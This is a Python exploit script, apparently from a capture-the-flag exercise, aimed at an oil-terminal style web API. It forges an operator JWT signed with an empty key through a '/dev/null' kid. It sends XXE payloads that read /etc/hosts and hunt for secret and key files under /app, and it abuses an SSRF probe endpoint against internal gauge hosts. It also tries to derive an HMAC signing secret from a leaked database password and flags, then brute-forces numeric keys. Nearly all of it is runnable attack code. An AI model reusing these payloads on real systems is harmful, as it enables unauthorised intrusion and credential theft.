#!/usr/bin/env python3
"""round37 — Retry /etc/hosts, diagnostics dump, probe SSRF with valid sigs, Flask instance"""
import requests, time, json, hmac as hm, hashlib, base64

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=20)
        if r.status_code == 200:
            try:
                d = r.json()
                return "OK", d.get("summary",{}).get(field,"")
            except:
                return "RAW", r.text[:500]
        elif r.status_code == 400:
            return "BIN", r.text[:200]
        else:
            return f"E{r.status_code}", r.text[:200]
    except Exception as e:
        return "ERR", str(e)[:150]

# ============================================================
print("="*70)
print("PHASE 1: RETRY /etc/hosts")
print("="*70)

for attempt in range(3):
    st, val = xxe_read("/etc/hosts")
    if st == "OK" and val:
        print(f"  [Attempt {attempt+1}] FOUND:")
        print(val)
        break
    elif st == "BIN":
        print(f"  [Attempt {attempt+1}] BINARY/SPECIAL CHARS")
        break
    else:
        print(f"  [Attempt {attempt+1}] {st}: {val[:100]}")
        time.sleep(2)

# ============================================================
print("\n"+"="*70)
print("PHASE 2: DIAGNOSTICS PAGE — FULL DUMP")
print("="*70)

try:
    r = S.get(f"{CASPI}/api/ops/diagnostics", headers=AUTH_OP, timeout=15)
    print(f"  Status: [{r.status_code}]")
    print(f"  Full response ({len(r.text)} bytes):")
    print(r.text[:5000])
except Exception as e:
    print(f"  Error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 3: PROBE SSRF — USE ALL 5 VALID SIGNATURES")
print("="*70)

probes = [
    ("lm-01", "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    ("tk-01", "http://gauge-gw.internal:9100/v1/tanks/1/level",
     "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"),
    ("tk-02", "http://gauge-gw.internal:9100/v1/tanks/2/level",
     "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197"),
    ("tk-03", "http://gauge-gw.internal:9100/v1/tanks/3/level",
     "c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3"),
    ("tk-07", "http://gauge-gw.internal:9100/v1/tanks/7/level",
     "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f"),
]

for device, url, sig in probes:
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
            json={"url": url, "sig": sig},
            headers=AUTH_OP, timeout=15)
        print(f"\n  [{device}] {url}")
        print(f"  Status: [{r.status_code}]")
        print(f"  Response: {r.text[:500]}")
    except Exception as e:
        print(f"  [{device}] Error: {e}")

# ============================================================
print("\n"+"="*70)
print("PHASE 4: FLASK INSTANCE FOLDER + HIDDEN CONFIGS")
print("="*70)

instance_paths = [
    "/app/instance/config.py",
    "/app/instance/config.json",
    "/app/instance/config.cfg",
    "/app/instance/.env",
    "/app/instance/secrets",
    "/app/instance/secrets.py",
    "/app/instance/probe.key",
    "/app/instance/keys",
    # Try common config locations
    "/app/conf/config.py",
    "/app/conf/secrets.py",
    "/app/config/secrets.py",
    "/app/config/keys.py",
    # Hidden files
    "/app/.secret_key",
    "/app/.flask_secret",
    "/app/.probe_secret",
    "/app/.config",
    "/app/.secrets",
    "/app/.keys",
    # Keys subdirectories
    "/app/keys/probe/secret",
    "/app/keys/.probe",
    "/app/keys/default",
    "/app/keys/master",
    "/app/keys/hmac",
    "/app/keys/gateway/secret",
]

for fp in instance_paths:
    st, val = xxe_read(fp)
    if st == "OK" and val:
        print(f"  [FOUND!] {fp}: '{val[:200]}'")
    elif st == "BIN":
        print(f"  [EXISTS/BIN] {fp}")

# ============================================================
print("\n"+"="*70)
print("PHASE 5: HTTP/FTP ENTITY TEST (outbound connectivity)")
print("="*70)

# Test if lxml can make outbound HTTP connections to localhost
for proto_url in [
    "http://127.0.0.1:3000/api/auth/me",
    "http://localhost:3000/api/auth/me",
    "http://127.0.0.1:3000/",
]:
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "{proto_url}">]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&x;</remarks>
</ticket>'''
    t0 = time.time()
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        elapsed = time.time() - t0
        print(f"  {proto_url}: [{r.status_code}] {elapsed:.1f}s {r.text[:100]}")
    except Exception as e:
        elapsed = time.time() - t0
        print(f"  {proto_url}: ERR {elapsed:.1f}s {str(e)[:100]}")

# ============================================================
print("\n"+"="*70)
print("PHASE 6: DERIVED PROBE SECRET ATTEMPTS")
print("="*70)

known_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
known_sig = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

# Maybe PROBE_SECRET is derived from other known values
derivations = [
    # SHA256/MD5 of known strings
    ("sha256('carrier')", hashlib.sha256(b"carrier").hexdigest().encode()),
    ("sha256('operator')", hashlib.sha256(b"operator").hexdigest().encode()),
    ("sha256('probe')", hashlib.sha256(b"probe").hexdigest().encode()),
    ("sha256('CaspiTerminal')", hashlib.sha256(b"CaspiTerminal").hexdigest().encode()),
    ("sha256('terminal')", hashlib.sha256(b"terminal").hexdigest().encode()),
    ("sha256('gauge-gw')", hashlib.sha256(b"gauge-gw").hexdigest().encode()),
    ("md5('carrier')", hashlib.md5(b"carrier").hexdigest().encode()),
    ("md5('operator')", hashlib.md5(b"operator").hexdigest().encode()),
    ("md5('probe')", hashlib.md5(b"probe").hexdigest().encode()),
    ("md5('CaspiTerminal')", hashlib.md5(b"CaspiTerminal").hexdigest().encode()),
    # Short hash prefixes
    ("sha256('probe')[:16]", hashlib.sha256(b"probe").hexdigest()[:16].encode()),
    ("sha256('probe')[:32]", hashlib.sha256(b"probe").hexdigest()[:32].encode()),
    # UUID-style
    ("md5('probe_secret')", hashlib.md5(b"probe_secret").hexdigest().encode()),
    ("md5('PROBE_SECRET')", hashlib.md5(b"PROBE_SECRET").hexdigest().encode()),
    # Hostname-based
    ("hostname", b"5407f6317f5c"),
    ("hostname+nl", b"5407f6317f5c\n"),
    # Database password
    ("db_pw", b"terminal_web_pw"),
    ("db_pw+nl", b"terminal_web_pw\n"),
    # Container ID (from hostname)
    ("container_id", b"5407f6317f5cb1c5e178d2edd9fe960f73126e60833d9c1f297d13d9ddeb1e75"),
    # Common CTF keys
    ("flag_xxe", b"STF{c8142af02727b3d7d51e4aece866104b}"),
    ("flag_lfi", b"KHS{c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95}"),
    ("flag_xxe_hash", bytes.fromhex("c8142af02727b3d7d51e4aece866104b")),
    ("flag_lfi_hash", bytes.fromhex("c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95")),
]

for label, key in derivations:
    computed = hm.new(key, known_url, hashlib.sha256).digest()
    if computed == known_sig:
        print(f"  MATCH: {label} = {key!r} <<<<<<")
        break
else:
    print("  No derived key match")

# ============================================================
print("\n"+"="*70)
print("PHASE 7: BRUTE-FORCE 5-BYTE MIXED CASE + DIGITS")
print("="*70)

# Try 5-byte with uppercase + lowercase + digits: 62^5 = 916M — too many
# Instead try 5-byte with just digits: 10^5 = 100K — instant
print("  Testing 5-digit numeric probe keys (100K)...")
t0 = time.time()
found = False
for i in range(100000):
    key = str(i).zfill(5).encode()
    if hm.new(key, known_url, hashlib.sha256).digest() == known_sig:
        print(f"  PROBE KEY FOUND: '{key.decode()}' <<<<<<")
        found = True
        break
if not found:
    print(f"  No 5-digit match ({time.time()-t0:.1f}s)")

# Try 6-digit numeric
print("  Testing 6-digit numeric probe keys (1M)...")
t0 = time.time()
for i in range(1000000):
    key = str(i).zfill(6).encode()
    if hm.new(key, known_url, hashlib.sha256).digest() == known_sig:
        print(f"  PROBE KEY FOUND: '{key.decode()}' <<<<<<")
        found = True
        break
if not found:
    print(f"  No 6-digit match ({time.time()-t0:.1f}s)")

# Try 7-digit numeric
print("  Testing 7-digit numeric probe keys (10M)...")
t0 = time.time()
for i in range(10000000):
    key = str(i).zfill(7).encode()
    if hm.new(key, known_url, hashlib.sha256).digest() == known_sig:
        print(f"  PROBE KEY FOUND: '{key.decode()}' <<<<<<")
        found = True
        break
if not found:
    print(f"  No 7-digit match ({time.time()-t0:.1f}s)")

# Try 8-digit numeric
print("  Testing 8-digit numeric probe keys (100M)...")
t0 = time.time()
for i in range(100000000):
    key = str(i).zfill(8).encode()
    if hm.new(key, known_url, hashlib.sha256).digest() == known_sig:
        print(f"  PROBE KEY FOUND: '{key.decode()}' <<<<<<")
        found = True
        break
    if i % 10000000 == 0 and i > 0:
        elapsed = time.time() - t0
        print(f"  Progress: {i//1000000}M/100M ({elapsed:.0f}s)", end="\r", flush=True)
if not found:
    print(f"\n  No 8-digit match ({time.time()-t0:.1f}s)")

print("\n"+"="*70)
print("DONE")
print("="*70)
